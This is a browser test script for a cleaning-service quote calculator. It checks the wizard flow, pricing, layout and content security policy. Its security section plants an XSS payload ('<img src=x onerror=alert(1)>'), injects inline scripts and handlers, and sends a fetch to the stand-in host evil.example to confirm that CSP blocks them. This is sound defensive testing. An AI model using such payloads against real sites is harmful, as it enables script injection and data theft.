import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { access, mkdir, mkdtemp, writeFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import { createPreviewServer } from './preview.mjs';
import { root } from './build.mjs';

// Uses the installed browser and Node's built-in CDP/WebSocket support. No
// downloaded test packages, remote browser, real customer data, or live service.
const candidates = [process.env.CHROME_PATH, 'C:/Program Files/Google/Chrome/Application/chrome.exe', 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe', '/usr/bin/google-chrome', '/usr/bin/chromium', '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'].filter(Boolean);
let executable;
for (const candidate of candidates) {
  if (await access(candidate).then(() => true, () => false)) { executable = candidate; break; }
}
assert.ok(executable, 'Install Chrome/Chromium or set CHROME_PATH. Browser tests must not silently skip.');
const artifacts = resolve(root, '.security-preview');
await mkdir(artifacts, { recursive: true });
const profile = await mkdtemp(resolve(artifacts, 'browser-'));
const server = createPreviewServer();
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
const base = `http://127.0.0.1:${server.address().port}`;
const browser = spawn(executable, ['--headless=new', '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--no-first-run', '--no-default-browser-check', '--remote-debugging-address=127.0.0.1', '--remote-debugging-port=0', `--user-data-dir=${profile}`, 'about:blank'], { windowsHide: true, stdio: ['ignore', 'ignore', 'pipe'] });
let socket;
try {
  const debugPort = await new Promise((resolve, reject) => {
    let output = '';
    const timeout = setTimeout(() => reject(new Error('Browser startup timed out')), 20000);
    browser.once('error', error => { clearTimeout(timeout); reject(error); });
    browser.once('exit', code => { clearTimeout(timeout); reject(new Error('Browser exited: ' + code)); });
    browser.stderr.on('data', chunk => {
      output += chunk.toString();
      const match = output.match(/DevTools listening on ws:\/\/127\.0\.0\.1:(\d+)/);
      if (match) { clearTimeout(timeout); resolve(match[1]); }
    });
  });
  const targets = await (await fetch(`http://127.0.0.1:${debugPort}/json/list`)).json();
  socket = new WebSocket(targets.find(target => target.type === 'page').webSocketDebuggerUrl);
  await new Promise((resolve, reject) => { socket.onopen = resolve; socket.onerror = reject; });
  let sequence = 0;
  const pending = new Map();
  const exceptions = [];
  const requests = [];
  const responses = [];
  socket.onmessage = event => {
    const message = JSON.parse(event.data);
    if (message.id) {
      const entry = pending.get(message.id);
      if (!entry) return;
      pending.delete(message.id);
      clearTimeout(entry.timeout);
      if (message.error) entry.reject(new Error(message.error.message));
      else entry.resolve(message.result);
    } else {
      if (message.method === 'Runtime.exceptionThrown') exceptions.push(message.params.exceptionDetails.text);
      if (message.method === 'Network.requestWillBeSent') requests.push(message.params.request.url);
      if (message.method === 'Network.responseReceived') responses.push(message.params.response);
    }
  };
  const send = (method, params = {}) => new Promise((resolve, reject) => {
    const id = ++sequence;
    const timeout = setTimeout(() => { pending.delete(id); reject(new Error('CDP timeout: ' + method)); }, 15000);
    pending.set(id, { resolve, reject, timeout });
    socket.send(JSON.stringify({ id, method, params }));
  });
  const evaluate = async expression => {
    const result = await send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true });
    if (result.exceptionDetails) throw new Error(result.exceptionDetails.exception?.description || result.exceptionDetails.text);
    return result.result.value;
  };
  await send('Runtime.enable');
  await send('Page.enable');
  await send('Network.enable');
  await send('Page.addScriptToEvaluateOnNewDocument', { source: `
    window.__violations = [];
    document.addEventListener('securitypolicyviolation', event => window.__violations.push(event.violatedDirective));
    try {
      localStorage.setItem('smartspro_leads_v1', '[{"customer":{"name":"<img src=x onerror=alert(1)>"}}]');
      localStorage.setItem('unrelated', 'keep');
    } catch {}
  ` });
  await send('Page.navigate', { url: base });
  for (let attempt = 0; attempt < 100; attempt++) {
    if (await evaluate('document.readyState === "complete" && !!window.SmartsProCurrentQuote')) break;
    if (attempt === 99) throw new Error('Application did not initialize');
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  await evaluate('document.fonts.ready.then(() => true)');
  await evaluate('document.querySelector(".construction-screen")?.remove()');
  assert.deepEqual(await evaluate('window.__violations'), [], 'Legitimate page triggered CSP');
  assert.deepEqual(exceptions, [], 'Runtime errors');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 250);
  assert.equal(await evaluate('localStorage.getItem("smartspro_leads_v1")'), null);
  assert.equal(await evaluate('localStorage.getItem("unrelated")'), 'keep');
  assert.equal(await evaluate('document.querySelectorAll("form, textarea, input[type=email], input[type=tel]").length'), 0);
  assert.equal(await evaluate('(async () => (await SmartsProBackend.submitBooking({name:"test"}, {})).success)()'), false);
  assert.equal(await evaluate('typeof SmartsProBackend.getLeads'), 'undefined');
  assert.equal(await evaluate('typeof SmartsProModal.openLeadsViewer'), 'undefined');
  await evaluate('document.dispatchEvent(new KeyboardEvent("keydown", {key:"L", shiftKey:true}))');
  assert.equal(await evaluate('document.querySelectorAll(".modal-overlay.open").length'), 0);
  // Clicking Complete Estimate & Schedule before selecting Type of Service pops Step 1 red and stays closed
  await evaluate('document.getElementById("btn-book-quote-now").click()');
  assert.equal(await evaluate('document.getElementById("booking-modal-overlay").classList.contains("open")'), false);
  assert.equal(await evaluate('document.getElementById("step1-service-grid").classList.contains("wizard-field-missing")'), true);

  // Step 1 validation: cannot advance until a Type of Service is selected
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 1);
  assert.equal(await evaluate('document.getElementById("step1-service-grid").classList.contains("wizard-field-missing")'), true);

  // Commercial flow: selecting Commercial reveals Overnight card and clicking Next skips directly to Cleaning Frequency (Step 2 of 2) with Custom Quote at Walkthrough
  await evaluate('document.getElementById("card-cat-commercial").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.dispatchEnvelope.workflow.id'), 'commercial_walkthrough_pipeline');
  assert.equal(await evaluate('document.getElementById("freq-card-overnight").classList.contains("is-hidden")'), false);
  assert.equal(await evaluate('document.getElementById("quote-total-amount").textContent'), 'Custom Quote at Walkthrough');
  assert.equal(await evaluate('document.getElementById("quote-price-currency").classList.contains("is-hidden")'), true);
  assert.equal(await evaluate('document.getElementById("summary-service-rate").textContent'), 'Custom Quote at Walkthrough');
  assert.equal(await evaluate('document.getElementById("freq-badge-weekly").textContent'), 'Preferred');
  assert.equal(await evaluate('document.getElementById("freq-badge-overnight").textContent'), 'After-Hours');
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 4);
  assert.equal(await evaluate('document.getElementById("calc-step-total").textContent'), '2');
  await evaluate('document.querySelector(\'[data-freq="overnight"]\').click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.frequencySurcharge'), 0);
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 0);
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.customQuoteAtWalkthrough'), true);
  assert.equal(await evaluate('document.getElementById("quote-total-amount").textContent'), 'Custom Quote at Walkthrough');
  assert.equal(await evaluate('document.getElementById("step4-overnight-notice").classList.contains("is-hidden")'), false);
  // Open Commercial Walkthrough modal and verify Custom Quote at Walkthrough across recap, toggle, and sticky bar
  await evaluate('document.getElementById("btn-book-quote-now").click()');
  assert.equal(await evaluate('document.getElementById("booking-modal-overlay").classList.contains("open")'), true);
  assert.equal(await evaluate('document.getElementById("modal-recap-total").textContent'), 'Custom Quote at Walkthrough');
  assert.equal(await evaluate('document.getElementById("modal-recap-toggle-total").textContent'), 'Custom Quote at Walkthrough');
  assert.equal(await evaluate('document.getElementById("modal-sticky-total").textContent'), 'Custom Quote at Walkthrough');
  assert.equal(await evaluate('document.getElementById("modal-recap-freq-fee-row").classList.contains("is-hidden")'), true);
  assert.equal(await evaluate('document.getElementById("btn-submit-estimate-email").textContent'), 'Schedule Walkthrough & Send Request');
  await evaluate('document.getElementById("modal-close-btn").click()');
  assert.equal(await evaluate('document.getElementById("booking-modal-overlay").classList.contains("open")'), false);
  await evaluate('document.getElementById("btn-wizard-prev").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 1);

  // Move-In / Move-Out flow: requires selecting Property Type (House, Apartment, Condo, or Townhome)
  await evaluate('document.getElementById("card-cat-moveinout").click()');
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 2);
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 2);
  assert.equal(await evaluate('document.getElementById("move-property-type-group").classList.contains("wizard-field-missing")'), true);
  await evaluate('document.querySelector(\'[data-prop-type="House"]\').click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.propertyType'), 'House');
  await evaluate('document.getElementById("btn-wizard-prev").click()');

  // Residential flow: select Residential Homes, advance to Step 2, verify house details red validation, then adjust beds
  await evaluate('document.getElementById("card-cat-residential").click()');
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 2);
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 2);
  assert.equal(await evaluate('document.getElementById("residential-tier-group").classList.contains("wizard-field-missing")'), true);
  await evaluate('document.getElementById("btn-bed-plus").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 275);

  // Extra Living Room stepper in Step 2 (0 -> 1 adds 0.5h and increases Standard Clean from $275 to $300, then revert to 0)
  await evaluate('document.getElementById("btn-living-plus").click()');
  assert.equal(await evaluate('document.getElementById("val-livingrooms").textContent'), '1');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 300);
  await evaluate('document.getElementById("btn-living-minus").click()');
  assert.equal(await evaluate('document.getElementById("val-livingrooms").textContent'), '0');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 275);

  // Advance to Step 3 (Additional Information) and verify mandatory 4-question validation
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 3);
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 3);
  assert.equal(await evaluate('document.getElementById("addinfo-group-pets").classList.contains("wizard-field-missing")'), true);

  // Choose "Yes, we have pets" -> auto-adds flat $35 Pet Hair & Detailing fee (275 + 35 = 310)
  await evaluate('document.getElementById("addinfo-pets-yes").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.addons.pets'), 1);
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 310);

  // Switch to "No pets" -> resets pets add-on to 0 ($275) and verify duplicate Step 5 pet card is removed
  await evaluate('document.getElementById("addinfo-pets-no").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.addons.pets'), 0);
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 275);
  assert.equal(await evaluate('document.getElementById("addon-item-pets")'), null);

  // Complete remaining 3 Additional Information questions and advance to Step 4 (Frequency)
  await evaluate('document.querySelector(\'[data-addinfo-val="1-3 Months ago"]\').click()');
  await evaluate('document.querySelector(\'[data-addinfo-val="Occupied, we live there"]\').click()');
  await evaluate('document.querySelector(\'[data-addinfo-val="Average, normal use"]\').click()');
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 4);

  // Verify Residential hides Overnight option and applies Weekly-anchor hybrid schedule surcharges ($275 base -> +0 / +33 / +55 / +72)
  assert.equal(await evaluate('document.getElementById("freq-card-overnight").classList.contains("is-hidden")'), true);
  assert.equal(await evaluate('document.querySelector(\'[data-freq="monthly"] .freq-name\').textContent'), 'Monthly');
  for (const [freq, surcharge, expectedTotal] of [
    ['biweekly', 33, 308],
    ['monthly', 55, 330],
    ['onetime', 72, 347],
    ['weekly', 0, 275]
  ]) {
    await evaluate(`document.querySelector('[data-freq="${freq}"]').click()`);
    assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.discountRate'), 0);
    assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.discountAmount'), 0);
    assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.frequencySurcharge'), surcharge);
    assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), expectedTotal);
    assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.onlinePaymentsEnabled'), false);
  }

  // Single Fridge Starting from $54.99 (275 + 54.99 = 329.99)
  await evaluate('document.getElementById("btn-fridge-plus").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 329.99);
  assert.equal(await evaluate('document.getElementById("summary-dispatch-val").textContent'), 'Calendar Slot + Email');
  assert.equal(await evaluate('document.getElementById("summary-online-payment-val").textContent'), '50% In Person');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.dispatchEnvelope.onlinePaymentEnabled'), false);
  assert.equal(await evaluate('window.SmartsProCurrentQuote.dispatchEnvelope.paymentPolicy'), 'NO_ONLINE_PAYMENT_REQUIRED');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.dispatchEnvelope.pricingModel'), 'WEEKLY_ANCHOR_HYBRID_PRICING');
  assert.equal(await evaluate('getComputedStyle(document.getElementById("summary-addons-row")).display'), 'flex');

  // Verify Specific Areas lives inside Step 5 (Add-Ons) and not inside Step 2 (Property Details)
  assert.equal(await evaluate('!!document.querySelector("#calc-step-2 #btn-scope-specific")'), false);
  assert.equal(await evaluate('!!document.querySelector("#calc-step-2 #scope-panel-specific")'), false);
  assert.equal(await evaluate('!!document.querySelector("#calc-step-5 #btn-scope-specific")'), true);
  assert.equal(await evaluate('!!document.querySelector("#calc-step-5 #scope-panel-specific")'), true);

  // Advance to Step 5, check zero hours wording, test new add-ons + service details input, and Specific Areas toggle
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 5);
  assert.doesNotMatch(await evaluate('document.getElementById("calc-step-5").textContent'), /\/hr|\bHours?\b/i);
  assert.match(await evaluate('document.getElementById("step5-deposit-note").textContent'), /50% deposit/i);

  // Verify updated Step 5 add-on titles & unit descriptions, then test Laundry ($48.98/load), Organizing per Area ($29.60/area), Dishes ($24.78), Windows ($8), Power Wash Window Sets ($25/set)
  assert.match(await evaluate('document.getElementById("addon-item-laundry").textContent'), /Starting from \$48\.98 per load/);
  assert.match(await evaluate('document.getElementById("addon-item-laundry").textContent'), /Wash, dry, and fold/);
  assert.match(await evaluate('document.getElementById("addon-item-organizing").textContent'), /Organizing per Area/);
  assert.match(await evaluate('document.getElementById("addon-item-organizing").textContent'), /Starting from \$29\.60 per area/);
  assert.match(await evaluate('document.getElementById("addon-item-powerwash").textContent'), /Power Wash Window Sets/);
  assert.match(await evaluate('document.getElementById("addon-item-powerwash").textContent'), /Starting from \$25 per set/);
  await evaluate('document.getElementById("btn-laundry-plus").click()');
  await evaluate('document.getElementById("btn-organizing-plus").click()');
  await evaluate('document.getElementById("btn-dishes-plus").click()');
  await evaluate('document.getElementById("btn-windows-plus").click()');
  await evaluate('document.getElementById("btn-powerwash-plus").click()');
  // 329.99 + 48.98 + 29.60 + 24.78 + 8 + 25 = 466.35
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 466.35);
  await evaluate('document.getElementById("btn-laundry-minus").click()');
  await evaluate('document.getElementById("btn-organizing-minus").click()');
  await evaluate('document.getElementById("btn-dishes-minus").click()');
  await evaluate('document.getElementById("btn-windows-minus").click()');
  await evaluate('document.getElementById("btn-powerwash-minus").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 329.99);

  // Test Details on what you may need done input box
  await evaluate('(() => { const d = document.getElementById("input-service-details"); d.value = "Inside kitchen pantry shelves"; d.dispatchEvent(new Event("input")); })()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.serviceDetails'), 'Inside kitchen pantry shelves');

  await evaluate('document.getElementById("btn-scope-specific").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.scopeMode'), 'specific');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 379.99);
  assert.equal(await evaluate('document.getElementById("summary-service-type").textContent'), 'Standard Clean');
  await evaluate('document.getElementById("btn-wizard-next").click()');
  assert.equal(await evaluate('document.getElementById("specific-areas-input-group").classList.contains("wizard-field-missing")'), true);
  await evaluate('document.getElementById("btn-scope-specific").click()');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.scopeMode'), 'full');
  assert.equal(await evaluate('window.SmartsProCurrentQuote.calculation.grandTotal'), 329.99);

  for (const [input, expected] of [['-100', 400], ['999999', 6000], ['', 400], ['1800', 1800]]) {
    await evaluate(`(() => { const field = document.getElementById('input-sqft'); field.value = ${JSON.stringify(input)}; field.dispatchEvent(new Event('input')); })()`);
    assert.equal(await evaluate('window.SmartsProCurrentQuote.state.sqft'), expected);
  }
  await evaluate('document.getElementById("btn-book-quote-now").click()');
  await evaluate('new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)))');
  assert.equal(await evaluate('document.getElementById("booking-modal-overlay").classList.contains("open")'), true);
  assert.equal(await evaluate('document.getElementById("modal-recap-total").textContent'), '$329.99');
  assert.equal(await evaluate('document.getElementById("modal-recap-hours").textContent'), '');
  assert.equal(await evaluate('document.getElementById("modal-recap-hours-row").classList.contains("is-hidden")'), true);
  assert.match(await evaluate('document.getElementById("modal-recap-policy").textContent'), /50% deposit/i);
  assert.equal(await evaluate('!!document.getElementById("modal-edit-details-btn")'), true);
  assert.equal(await evaluate('!!document.getElementById("btn-refresh-calendar")'), true);
  assert.equal(await evaluate('!!document.getElementById("calendar-date-grid")'), true);
  assert.equal(await evaluate('document.getElementById("calendar-date-grid").classList.contains("calendar-date-wheel")'), true);
  assert.equal(await evaluate('document.querySelectorAll("#calendar-date-grid .calendar-wheel-item").length > 0'), true);
  assert.equal(await evaluate('!!document.querySelector("#calendar-date-grid .calendar-wheel-item.is-wheel-center")'), true);
  assert.equal(await evaluate('!!document.getElementById("btn-wheel-prev") && !!document.getElementById("btn-wheel-next")'), true);
  assert.equal(await evaluate('!!document.getElementById("modal-sticky-footer")'), true);
  assert.equal(await evaluate('document.getElementById("modal-sticky-total").textContent'), '$329.99');
  assert.equal(await evaluate('document.getElementById("modal-sticky-cta").textContent'), 'Continue to Contact');

  // Verify vertical wheel Next Day nudge advances selected date and syncs sticky footer & banner
  const initialWheelDate = await evaluate('document.querySelector("#calendar-date-grid .calendar-wheel-item.active")?.getAttribute("data-cal-date")');
  const nextWheelBtnDisabled = await evaluate('document.getElementById("btn-wheel-next").disabled');
  if (!nextWheelBtnDisabled) {
    await evaluate('document.getElementById("btn-wheel-next").click()');
    await evaluate('new Promise(resolve => setTimeout(resolve, 60))');
    const steppedWheelDate = await evaluate('document.querySelector("#calendar-date-grid .calendar-wheel-item.active")?.getAttribute("data-cal-date")');
    assert.notEqual(steppedWheelDate, initialWheelDate);
    assert.ok((await evaluate('document.getElementById("modal-sticky-slot").textContent')).includes('·'));
  }

  // Verify live green validation checkmarks on First Name, Last Name, Phone, Email and sticky CTA transition
  await evaluate(`(() => {
    const setVal = (id, val) => { const el = document.getElementById(id); el.value = val; el.dispatchEvent(new Event('input')); el.dispatchEvent(new Event('blur')); };
    setVal('intake-first-name', 'Jordan');
    setVal('intake-last-name', 'Taylor');
    setVal('intake-phone', '3185550199');
    setVal('intake-email', 'jordan.taylor@example.com');
  })()`);
  assert.equal(await evaluate('document.getElementById("intake-first-name").closest(".intake-field-group").classList.contains("is-field-valid")'), true);
  assert.equal(await evaluate('document.getElementById("intake-last-name").closest(".intake-field-group").classList.contains("is-field-valid")'), true);
  assert.equal(await evaluate('document.getElementById("intake-phone").closest(".intake-field-group").classList.contains("is-field-valid")'), true);
  assert.equal(await evaluate('document.getElementById("intake-email").closest(".intake-field-group").classList.contains("is-field-valid")'), true);
  assert.equal(await evaluate('document.getElementById("modal-sticky-cta").textContent'), 'Send Estimate & Request Slot');

  assert.equal(await evaluate('!!document.getElementById("calendar-slot-grid")'), true);
  assert.equal(await evaluate('document.querySelector(\'[data-cal-slot="14:00-16:30"]\').disabled'), false);
  assert.equal(await evaluate('document.querySelector(\'[data-cal-slot="14:00-16:30"]\').classList.contains("is-cutoff")'), false);
  assert.equal(await evaluate('document.querySelector(\'[data-cal-slot="08:00-11:00"]\').disabled'), false);
  assert.equal(await evaluate('!!document.getElementById("upcoming-bookings-list")'), true);
  assert.equal(await evaluate('!!document.getElementById("intake-first-name")'), true);
  assert.equal(await evaluate('!!document.getElementById("intake-last-name")'), true);
  assert.equal(await evaluate('!!document.getElementById("intake-phone")'), true);
  assert.equal(await evaluate('!!document.getElementById("intake-email")'), true);
  assert.equal(await evaluate('!!document.getElementById("intake-notes")'), true);

  // Capture desktop 2-column modal screenshot at 1440x1000
  await send('Emulation.setDeviceMetricsOverride', { width: 1440, height: 1000, deviceScaleFactor: 1, mobile: false });
  await evaluate('new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)))');
  assert.equal(await evaluate('document.getElementById("booking-modal-container").scrollWidth <= document.getElementById("booking-modal-container").clientWidth + 1'), true);
  const desktopModalCapture = await send('Page.captureScreenshot', { format: 'png', captureBeyondViewport: false });
  await writeFile(resolve(artifacts, 'estimate-desktop.png'), Buffer.from(desktopModalCapture.data, 'base64'));

  // Verify Edit Details button returns from modal directly to Step 2
  await evaluate('document.getElementById("modal-edit-details-btn").click()');
  assert.equal(await evaluate('document.getElementById("booking-modal-overlay").classList.contains("open")'), false);
  assert.equal(await evaluate('window.SmartsProCurrentQuote.state.wizardStep'), 2);

  // Re-open with long unbroken Specific Areas text and verify zero horizontal modal overflow + initial focus target
  await evaluate('document.getElementById("btn-scope-specific").click()');
  await evaluate('(() => { const el = document.getElementById("input-specific-areas"); el.value = "testing area, " + "d".repeat(140); el.dispatchEvent(new Event("input")); })()');
  await evaluate('document.getElementById("btn-book-quote-now").click()');
  await evaluate('new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)))');
  assert.equal(await evaluate('document.activeElement.id'), 'modal-close-btn', await evaluate(`JSON.stringify({ active: document.activeElement.outerHTML.slice(0, 150), modalVisibility: getComputedStyle(document.getElementById('booking-modal-overlay')).visibility, buttonVisibility: getComputedStyle(document.getElementById('modal-close-btn')).visibility, rect: document.getElementById('modal-close-btn').getBoundingClientRect().toJSON() })`));
  assert.equal(await evaluate('document.getElementById("booking-modal-container").scrollWidth <= document.getElementById("booking-modal-container").clientWidth + 1'), true);
  await evaluate('document.getElementById("btn-scope-specific").click()');
  await evaluate('document.dispatchEvent(new KeyboardEvent("keydown", {key:"Escape"}))');
  assert.equal(await evaluate('document.getElementById("booking-modal-overlay").classList.contains("open")'), false);

  for (const [width, height] of [[1440, 1000], [390, 844]]) {
    await send('Emulation.setDeviceMetricsOverride', { width, height, deviceScaleFactor: 1, mobile: width < 500 });
    await evaluate('new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)))');
    assert.equal(await evaluate(`document.documentElement.scrollWidth <= document.documentElement.clientWidth && window.innerWidth === ${width}`), true, await evaluate(`JSON.stringify({width: innerWidth, clientWidth: document.documentElement.clientWidth, overflow: [...document.querySelectorAll('body *')].filter(el => !el.closest('.checklist-table-wrapper')).map(el => ({tag: el.tagName, id: el.id, classes: el.className, right: el.getBoundingClientRect().right})).filter(el => el.right > document.documentElement.clientWidth + 1).sort((a,b) => b.right-a.right).slice(0,20)})`));
    const capture = await send('Page.captureScreenshot', { format: 'png', captureBeyondViewport: false });
    await writeFile(resolve(artifacts, `home-${width}.png`), Buffer.from(capture.data, 'base64'));
  }
  await evaluate('SmartsProModal.openBookingModal()');
  await evaluate('new Promise(resolve => setTimeout(resolve, 300))');
  // Verify mobile collapsible estimate summary starts collapsed and toggles cleanly
  assert.equal(await evaluate('document.getElementById("modal-quote-recap").classList.contains("is-mobile-collapsed")'), true);
  assert.equal(await evaluate('document.getElementById("modal-recap-toggle").getAttribute("aria-expanded")'), 'false');
  assert.equal(await evaluate('document.getElementById("booking-modal-container").scrollWidth <= document.getElementById("booking-modal-container").clientWidth + 1'), true);
  const modalCapture = await send('Page.captureScreenshot', { format: 'png', captureBeyondViewport: false });
  await writeFile(resolve(artifacts, 'estimate-mobile.png'), Buffer.from(modalCapture.data, 'base64'));
  await evaluate('document.getElementById("modal-recap-toggle").click()');
  assert.equal(await evaluate('document.getElementById("modal-quote-recap").classList.contains("is-mobile-collapsed")'), false);
  assert.equal(await evaluate('document.getElementById("modal-recap-toggle").getAttribute("aria-expanded")'), 'true');
  await evaluate('document.getElementById("modal-recap-toggle").click()');
  assert.equal(await evaluate('document.getElementById("modal-quote-recap").classList.contains("is-mobile-collapsed")'), true);
  await evaluate('SmartsProModal.closeBookingModal(); document.getElementById("contact-intake-notice").scrollIntoView({behavior:"instant", block:"center"})');
  await evaluate('new Promise(resolve => setTimeout(resolve, 300))');
  const contactCapture = await send('Page.captureScreenshot', { format: 'png', captureBeyondViewport: false });
  await writeFile(resolve(artifacts, 'contact-mobile.png'), Buffer.from(contactCapture.data, 'base64'));
  assert.deepEqual(await evaluate('window.__violations'), [], 'Interactions triggered CSP');
  assert.ok(responses.filter(response => response.url.startsWith(base)).every(response => response.status === 200), 'A page asset failed to load');
  assert.ok(requests.every(url => url.startsWith(base)), 'Unexpected third-party network request');
  assert.equal(await evaluate('[...document.fonts].filter(font => font.status === "loaded").length'), 3);
  console.log('PASS calculator, estimate modal, vertical date wheel, live validation, mobile layout, local fonts, and legacy cleanup');

  // Exercise the browser's real CSP enforcement with harmless attack probes.
  await evaluate(`(() => {
    const script = document.createElement('script');
    script.textContent = 'window.__inlineExecuted = true';
    document.head.append(script);
    const button = document.createElement('button');
    button.setAttribute('onclick', 'window.__handlerExecuted = true');
    document.body.append(button);
    button.click();
  })()`);
  assert.equal(await evaluate('!!window.__inlineExecuted || !!window.__handlerExecuted'), false);
  assert.equal(await evaluate(`fetch('https://evil.example/collect', {method:'POST', body:'probe'}).then(() => false, () => true)`), true);
  await evaluate('new Promise(resolve => setTimeout(resolve, 100))');
  const violations = await evaluate('window.__violations');
  assert.ok(violations.includes('script-src-elem'));
  assert.ok(violations.includes('script-src-attr'));
  assert.ok(violations.includes('connect-src'));
  console.log('PASS inline script, inline event handler, and third-party network submission blocked by CSP');

  await send('Emulation.setScriptExecutionDisabled', { value: true });
  await send('Page.navigate', { url: base });
  await new Promise(resolve => setTimeout(resolve, 500));
  const document = await send('DOM.getDocument');
  const forms = await send('DOM.querySelectorAll', { nodeId: document.root.nodeId, selector: 'form, textarea, input[type=email], input[type=tel]' });
  assert.equal(forms.nodeIds.length, 0);
  console.log('PASS no personal-data intake when JavaScript is disabled');

  await send('Emulation.setScriptExecutionDisabled', { value: false });
  await send('Page.navigate', { url: `${base}/api/finish-early?token=invalid.token` });
  await new Promise(resolve => setTimeout(resolve, 400));
  assert.deepEqual(await evaluate('window.__violations'), [], 'Finish-early page triggered CSP');
  assert.equal(await evaluate('document.querySelectorAll("form").length'), 0);
  console.log('PASS /api/finish-early strict CSP page check');
} finally {
  if (socket) socket.close();
  browser.kill();
  server.closeAllConnections();
  await new Promise(resolve => server.close(resolve));
}
